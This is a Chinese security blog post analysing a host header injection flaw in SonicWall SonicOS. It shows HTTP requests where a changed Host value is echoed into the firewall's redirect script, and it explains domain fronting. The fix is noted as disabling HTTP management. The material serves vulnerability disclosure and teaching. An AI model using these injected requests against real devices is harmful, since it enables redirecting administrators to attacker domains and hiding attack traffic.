# 浅谈Sonicwall SonicOS的host头注入，防火墙绝对安全？

阅读量 **214240**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-10-27 16:30:21

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p3.ssl.qhimg.com/t017d5b3151fa1dd1f9.jpg)

## 前言

最近研究一些防火墙的一些技术，因为现在大多数服务器都架设了防火墙，所以管理员们一致认为只要有了防火墙，那服务器就是安全的，但事实真是如此么？有的时候正是这种所谓的“安全”导致了一些逻辑上面的漏洞。

## Sonicwall

Sonicwall是互联网安全设备为各类组织提供一流的安全平台，简单说就是做防火墙的。  
官网：<https://www.sonicwall.com/>  
SonicOS是其的一个产品，这是它的数据表

![](https://p5.ssl.qhimg.com/t0182ed5241cb040e29.png)

漏洞也发生在这个产品上  
SonicOS的操作界面

![](https://p5.ssl.qhimg.com/t01a81999fe29172e90.png)

## host注入

首先host头注入漏洞可能使攻击者能够欺骗特定主机标头，从而使攻击者能够呈现指向带有中毒主机标头网页的恶意网站的任意链接。  
在Sonicwall中发现一个问题，host头的值被隐式设置为受信任，从而导致host注入，SonicOS
中的主机头重定向漏洞可能允许远程攻击者将防火墙管理用户重定向到任意 Web 域。而这应该被禁止，并且受影响的主机可以用于域前置。  
给大家介绍一下域前置：  
域前置技术必须要用https，因为它是基于TLS协议的，域前置还有一个特点是需要修改请求包的host头（host头注入根本），修改方法是修改malleable
profile文件，域前置技术可以使用别人的高信誉域名来隐藏自己的真实域名，例如用百度的域名伪装自己，当然前提是百度的域名得跟你的域名再同一个CDN下，这种技术现在在不少的CDN厂商下都被禁止了，不一定会利用成功。一旦成功，攻击者可以利用受影响的主机在各种其他攻击中隐藏。  
以下是在SonicOS配置下截取的一个包：

    
    
    GET / HTTP/1.1
    Host: 127.0.0.1
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    DNT: 1
    Connection: close
    Upgrade-Insecure-Requests:
    Cache-Control: max-age=0

他的响应如下：

    
    
     HTTP/1.0 200 OK
    Server: SonicWALL
    Expires: -1
    Cache-Control: no-cache
    Content-type: text/html; charset=UTF-8;
    X-Content-Type-Options: nosniff
    X-XSS-Protection: 1; mode=block
    X-Frame-Options: SAMEORIGIN
    Content-Security-Policy: default-src ‘self’ ‘unsafe-inline’ ‘unsafe-eval’ blob: data: ws: wss: sonicwall.com *.sonicwall.com;
    
    <html>
    
    <body>
    Please be patient as you are being re-directed to <a href="https://127.0.0.1/index.html" target="_top"></a>
    </body>
    </html>

当出现Please be patient as you are being re-directed时，说明网站在跳转页面，和重定向有异曲同工之妙，返回包中，防火墙返回了域名地址，这个时候防火墙所在的服务器也会访问此地址。  
我们试着改一下这个host  
`GET / HTTP/1.1  
Host: 127.0.0.2  
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101
Firefox/68.0  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  
Accept-Language: en-US,en;q=0.5  
Accept-Encoding: gzip, deflate  
DNT: 1  
Connection: close  
Upgrade-Insecure-Requests: 1  
Cache-Control: max-age=0`  
注意：改的host必须要和服务器处于同一个cdn下才可以实现域前置。  
此时的相应包会是这样：

    
    
    HTTP/1.0 200 OK
    Server: SonicWALL
    Expires: -1
    Cache-Control: no-cache
    Content-type: text/html; charset=UTF-8;
    X-Content-Type-Options: nosniff
    X-XSS-Protection: 1; mode=block
    X-Frame-Options: SAMEORIGIN
    Content-Security-Policy: default-src ‘self’ ‘unsafe-inline’ ‘unsafe-eval’ blob: data: ws: wss: sonicwall.com *.sonicwall.com;
    
    <html>
    
    <head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <script type="text/JavaScript">
    var resetSecureFlag = false;
    setTimeout(“goJump();”, 1000);
    function goJump() {
    var jumpURL = “https://127.0.0.2/index.html“;
    var jumpProt = jumpURL.substr(0,6).toLowerCase();
    var ix;
    if (jumpProt.substr(0,4) == “http” && (ix = jumpProt.indexOf(“:”)) != -1) {
    jumpProt = jumpProt.substr(0,ix+1);
    if (location.protocol.toLowerCase() != jumpProt) {
    window.opener = null;
    top.opener = null;
    }
    }
    if (resetSecureFlag) {
    var sessId = getCookie(“SessId”);
    var pageSeed = swlStore.get(“PageSeed”, {isGlobal: true});
    if (sessId) { setCookieExt(“SessId”, sessId, { strictSameSite: true }); }
    if (pageSeed) { swlStore.set(“PageSeed”, pageSeed, {isGlobal: true}); }
    }
    top.location.href = jumpURL;
    }
    function setCookie(key, value) {
    var argv = setCookie.arguments;
    var argc = setCookie.arguments.length;
    var expires = (argc > 2) ? argv[2] : null;
    var path = (argc > 3) ? argv[3] : null;
    var domain = (argc > 4) ? argv[4] : null;
    var secure = (argc > 5) ? argv[5] : false;
    document.cookie = key + “=” + escape (value) +
    ((expires == null) ? “” : (“; expires=” + expires.toGMTString())) +
    ((path == null) ? “” : (“; path=” + path)) +
    ((domain == null) ? “” : (“; domain=” + domain)) +
    ((secure == true) ? “; secure” : “”);
    }
    function getCookie(key) {
    if (document.cookie.length) {
    var cookies = ‘ ‘ + document.cookie;
    var start = cookies.indexOf(‘ ‘ + key + ‘=’);
    if (start == -1) {
    return null;
    }
    var end = cookies.indexOf(“;”, start);
    if (end == -1) {
    end = cookies.length;
    }
    end -= start;
    var cookie = cookies.substr(start,end);
    return unescape(cookie.substr(cookie.indexOf(‘=’) + 1, cookie.length - cookie.indexOf(‘=’) + 1));
    } else {
    return null;
    }
    }
    </script>
    Please be patient as you are being re-directed to <a href="https://127.0.0.2/index.html" target="_top"></a>
    </head>
    </html>

你可以发现他的jumpURL变成了我们设置的，可以证明确实存在host注入的。  
漏洞成因就是SonicOS默认主机头是信任的，且每次会把host给到jumpURL，架设了防火墙带来了host注入，此时你还认为防火墙绝对安全么？

## 解决方法

此漏洞在2021 年 10 月 12 日已被官方解决  
禁用 HTTP 管理，仅使用 HTTPS 管理。  
但我认为这治标不治本啊，防火墙本身还是认为host是安全的啊！希望下一个版本可以彻底解决此问题。

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **xingshen** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/256396](/post/id/256396)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [防火墙](/tag/防火墙)
  * [政企安全](/tag/政企安全)

 **+1** __0赞

 __收藏

![](https://thirdqq.qlogo.cn/g?b=oidb&k=aOMzTWhDx89wQrX2SZxgCA&s=40&t=1630241543)
xingshen

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

